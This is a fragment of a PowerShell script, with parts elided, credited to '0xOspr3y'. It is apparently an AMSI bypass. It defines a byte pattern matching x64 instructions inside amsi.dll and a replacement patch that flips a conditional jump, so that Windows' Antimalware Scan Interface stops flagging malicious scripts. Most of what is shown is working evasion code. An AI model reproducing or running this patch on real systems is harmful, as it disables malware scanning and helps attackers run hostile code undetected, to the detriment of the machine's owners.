...
Write-Host "-- Modified Again By: 0xOspr3y. No modifications or obfuscation."
...
If ([IntPtr]::Size -eq 8) {
    ...
    [byte[]]$egg = [byte[]] (
        0x74, 0x66,             # je      amsi.xxxxxxxx33F5
        0x85, 0xFF,             # test	  edi,edi
        0x74, 0x62,             # je      amsi.xxxxxxxx33F5
        0x48, 0x85, 0xED,       # test    rbp,rbp
        0x74, 0x5D,             # je	  amsi.xxxxxxxx33F5
...
$patch = [byte[]] (
    0x75, 0x66,    # jne amsi.xxxxxxx33F5
	0xCC
)
